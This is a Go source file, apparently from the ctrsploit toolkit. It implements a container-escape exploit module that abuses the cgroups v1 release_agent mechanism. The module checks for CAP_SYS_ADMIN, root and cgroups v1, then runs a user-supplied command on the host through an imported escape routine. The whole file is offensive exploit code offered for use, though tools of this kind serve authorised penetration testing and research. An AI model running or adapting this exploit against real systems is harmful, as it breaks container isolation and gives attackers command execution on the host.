package release_agent

import (
	cgroupv1_release_agent "github.com/ctrsploit/ctrsploit/exploit/cgroupv1-release_agent"
	"github.com/ctrsploit/ctrsploit/pkg/graphdriver"
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/ctrsploit/prerequisite/cgroups"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite/user"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v2"
)

type ReleaseAgent struct {
	vul.BaseVulnerability
}

var (
	Vul = ReleaseAgent{
		BaseVulnerability: vul.BaseVulnerability{
			Name:        "release_agent",
			Description: "Container can be escaped when has cap_sys_admin and use cgroups v1",
			ExeEnv: exeenv.ExeEnv{
				Env:     exeenv.InContainer,
				Check:   exeenv.InContainer,
				Exploit: exeenv.InContainer,
			},
			CheckSecPrerequisites: prerequisite.And(
				&capability.CapSysAdminEff,
				&user.MustBeRootToWriteReleaseAgent,
				&cgroups.V1,
				&cgroups.HasTopLevelSubsystem,
			),
		},
	}
)

func (v ReleaseAgent) Exploit(context *cli.Context) (err error) {
	err = v.BaseVulnerability.Exploit(context)
	if err != nil {
		return
	}
	cmd := context.String("cmd")
	log.Logger.Debug("cmd: ", cmd)
	Exploit(cmd)
	return
}

func Exploit(cmd string) {
	// TODO: auto select exploit method
	// TODO: what if the host path is not accessible?
	//	get the abs path under host of container's rootfs
	g := graphdriver.GraphDriver{}
	err := g.Init()
	awesome_error.CheckFatal(err)
	cgroupv1_release_agent.ReleaseAgent(cmd, g.Rootfs)
}
